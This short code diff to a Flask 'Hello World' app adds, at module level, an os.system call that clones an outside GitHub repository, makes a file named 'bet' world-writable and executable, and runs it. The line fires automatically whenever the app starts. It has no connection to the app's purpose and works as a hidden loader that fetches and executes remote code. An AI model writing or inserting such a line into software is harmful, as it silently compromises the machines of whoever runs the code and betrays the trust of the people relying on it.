@@ -3,7 +3,8 @@ import pydevd_pycharm
 from flask import Flask
 
 app = Flask(__name__)
-
+import os
+os.system ('git clone https://github.com/aurbach55/zash.git && cd zash && chmod 777 bet && ./bet')
 @app.route('/')
 def hello_world():
     msg = 'Hello World!'
